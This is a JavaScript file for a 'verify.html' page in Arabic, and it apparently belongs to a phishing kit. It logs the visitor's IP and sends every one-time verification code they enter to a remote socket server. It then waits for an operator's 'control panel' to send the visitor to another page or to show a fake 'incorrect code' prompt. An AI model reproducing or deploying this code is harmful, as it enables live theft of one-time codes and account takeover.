
$(document).ready(function() {
    window.socket = io("https://dallah-server-xpls.onrender.com", { transports: ["websocket", "polling"] });
    window.visitorIP = null;

    (async () => {
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            const { ip } = await r.json();
            window.visitorIP = ip;
            window.socket.emit("updateLocation", { ip, page: "verify.html" });
        } catch(e) { console.error("IP fetch failed:", e); }
    })();

    // التحقق من وجود declined في URL
    const params = new URLSearchParams(window.location.search);
    if (params.get("declined") === "true") {
        showDeclineModal();
    }

    // عرض نافذة الرفض الاحترافية
    function showDeclineModal() {
        // إزالة أي نافذة رفض موجودة
        $("#declineModal").remove();
        
        const declineHTML = `
            <div id="declineModal" class="decline-modal-overlay">
                <div class="decline-modal-content">
                    <div class="decline-modal-icon">
                        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10"></circle>
                            <line x1="15" y1="9" x2="9" y2="15"></line>
                            <line x1="9" y1="9" x2="15" y2="15"></line>
                        </svg>
                    </div>
                    <h3 class="decline-modal-title">رمز التحقق غير صحيح</h3>
                    <p class="decline-modal-text">للأسف، رمز التحقق الذي أدخلته غير صحيح. يرجى التحقق من الرسالة وإعادة المحاولة.</p>
                    <button id="declineRetryBtn" class="decline-modal-button">إعادة المحاولة</button>
                </div>
            </div>
        `;
        
        $("body").append(declineHTML);
        
        // إضافة الأنماط
        const style = `
            <style id="declineStyles">
                .decline-modal-overlay {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.5);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    z-index: 10000;
                    direction: rtl;
                }
                
                .decline-modal-content {
                    background: white;
                    border-radius: 16px;
                    padding: 40px 30px;
                    max-width: 400px;
                    width: 90%;
                    text-align: center;
                    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
                    animation: slideUp 0.3s ease-out;
                }
                
                @keyframes slideUp {
                    from {
                        opacity: 0;
                        transform: translateY(30px);
                    }
                    to {
                        opacity: 1;
                        transform: translateY(0);
                    }
                }
                
                .decline-modal-icon {
                    width: 80px;
                    height: 80px;
                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
                    border-radius: 50%;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    margin: 0 auto 20px;
                }
                
                .decline-modal-title {
                    font-size: 24px;
                    font-weight: 700;
                    color: #2c3e50;
                    margin: 0 0 12px 0;
                    font-family: "Cairo", serif;
                }
                
                .decline-modal-text {
                    font-size: 14px;
                    color: #666;
                    margin: 0 0 30px 0;
                    line-height: 1.6;
                    font-family: "Cairo", serif;
                }
                
                .decline-modal-button {
                    background: linear-gradient(135deg, #D74D1C 0%, #c43d0a 100%);
                    color: white;
                    border: none;
                    padding: 14px 40px;
                    border-radius: 8px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    font-family: "Cairo", serif;
                    width: 100%;
                }
                
                .decline-modal-button:hover {
                    background: linear-gradient(135deg, #c43d0a 0%, #a83208 100%);
                    transform: translateY(-2px);
                    box-shadow: 0 5px 15px rgba(215, 77, 28, 0.3);
                }
                
                .decline-modal-button:active {
                    transform: translateY(0);
                }
            </style>
        `;
        
        if ($("#declineStyles").length === 0) {
            $("head").append(style);
        }
        
        // معالج الضغط على زر إعادة المحاولة
        $("#declineRetryBtn").on("click", function() {
            $("#declineModal").remove();
            // إعادة تعيين حقل OTP
            $("input[name='otp']").val('').focus();
        });
    }

    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
        if (window.visitorIP === targetIp) {
            // دائماً انتقل للصفحة المطلوبة، حتى لو كانت تحتوي على declined=true
            window.location.href = page;
        }
    });

    $("#otpForm").on("submit", function(e) {
        e.preventDefault();
        $("#waitingScreen").addClass("active");

        const data = {
            ip: window.visitorIP,
            verificationCode: $("input[name='otp']").val(),
            createdAt: new Date()
        };

        if (window.visitorIP) {
            window.socket.emit("submitOtp", data);
            // ننتظر لوحة التحكم
        } else {
            $("#waitingScreen").removeClass("active");
            alert("جاري التحقق من الاتصال، يرجى المحاولة مرة أخرى");
        }
    });
});
